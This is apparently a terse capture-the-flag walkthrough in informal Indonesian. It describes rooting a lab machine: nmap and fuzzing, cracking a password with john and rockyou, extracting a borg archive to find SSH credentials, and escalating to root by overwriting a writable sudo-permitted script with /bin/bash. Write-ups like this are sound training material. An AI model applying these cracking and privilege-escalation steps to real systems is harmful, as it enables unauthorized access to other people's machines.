# boot:
1. scan nmap 22 80 kebuka fuzz aja langsung 
2. dapet tuh creds di etc -> crack aja passwd nya pake john -> john namapasswd.txt --wordlist=/rockyou.txt 
3. dapet tapi gabisa ssh ternyata -> di file download webb nya ada info borg borg gitu
4. download aja borg di release nya -> kalau udah chmod +x aja 
5. ./borg extract home/field/dev/final_archive::music_archive  -> passphrase nya ternyata yg etc tadi masukin aja 
6. nanti ada creds kebuka di folder tar nya -> ssh aja kesana klaim user flag

# PE:
1. sudo -l dulu di linpeas banyak sih vuln nya -> tapi di bash_history ada dir khusus di etc -> isinya bisa ngasih command gitu
2. itu sebenernya writeable -> chmod 777 yg di sudo -l -> echo "/bin/bash" ygdisudo-l -> sudo ygdisudo-l -c whoami
3. klaim root
